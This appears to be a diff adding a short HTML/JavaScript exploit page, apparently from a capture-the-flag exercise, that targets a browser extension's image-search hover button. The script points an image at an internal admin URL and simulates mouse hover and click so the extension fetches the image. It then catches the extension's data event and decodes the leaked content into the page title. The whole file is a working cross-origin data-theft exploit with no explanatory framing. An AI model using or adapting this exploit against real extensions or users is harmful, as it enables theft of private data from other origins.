@@ -1,0 +1,22 @@
+<img id="victim" style="width: 150px; height: 150px" src="http://127.0.1.14:1919/admin">
+<script>
+function sleep(x) {
+    return new Promise(resolve=>setTimeout(resolve, x));
+}
+async function pwn() {
+    await sleep(800); // wait for content script to init
+    
+    window.addEventListener('sendDataToContentScript', (e)=>{
+        let msg = e.detail.message;
+        document.title = atob(msg.split(',')[1]);
+    });
+    let img = document.querySelector('#victim');
+    img.dispatchEvent(new MouseEvent('mousemove', {clientX: 100, clientY: 100, bubbles: true}));
+    await sleep(800);
+    
+    let btn = document.querySelector('#chrome_pc_imgSearch_hoverWrapper>div');
+    btn.click();
+}
+pwn();
+</script>
+EOF
